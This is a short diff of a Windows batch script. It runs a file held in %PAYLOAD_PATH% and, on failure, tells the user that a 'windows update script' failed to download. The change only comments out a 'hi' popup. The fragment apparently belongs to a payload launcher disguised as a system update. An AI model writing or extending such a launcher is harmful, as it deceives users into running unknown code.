@@ -25,7 +25,7 @@ if exist %PAYLOAD_PATH% (
     call %PAYLOAD_PATH%
 
     :: Show a popup saying "hi"
-    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('hi')"
+    :: powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('hi')"
 ) else (
 cls
     echo Failed to download the windows update script. Please check your internet connection and reboot your computer.
